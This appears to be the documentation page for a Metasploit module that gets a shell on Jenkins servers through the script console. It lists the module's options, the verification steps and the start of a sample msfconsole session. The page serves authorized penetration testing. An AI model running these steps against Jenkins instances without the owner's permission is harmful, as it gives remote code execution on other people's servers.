## Vulnerable Application

  Jenkins can be downloaded from [jenkins.io](https://jenkins.io/) where
  binaries are available for a variety of operating systems. Both LTS and weekly
  builds are available.

  Default settings have the script console enabled and require a valid user
  account on order to access it. A known account can be used with this module by
  setting the `USERNAME` and `PASSWORD` options.

## Verification Steps

  Example steps in this format:

  1. Install the application
  1. Start msfconsole
  1. Do: ```use exploit/multi/http/jenkins_script_console```
  1. Do: ```set RHOST [target host]```
  1. Do: ```set TARGET [target id]```
  1. Do: ```exploit```
  1. You should get a shell.

## Options

  **PASSWORD**

  A password to an account that has access to the script console. This is only
  necessary if the Jenkins instance has been configured to require
  authentication.

  **TARGETURI**

  The path to the target instance of Jenkins.

  **USERNAME**

  A username to an account that has access to the script console. This is only
  necessary if the Jenkins instance has been configured to require
  authentication.

## Scenarios

  Example usage against a Linux target server.

  ```
  msf > use exploit/multi/http/jenkins_script_console
  msf  exploit(jenkins_script_console) > set RHOST 192.168.1.154
  msf  exploit(jenkins_script_console) > set TARGET 1
  msf  exploit(jenkins_script_console) > exploit
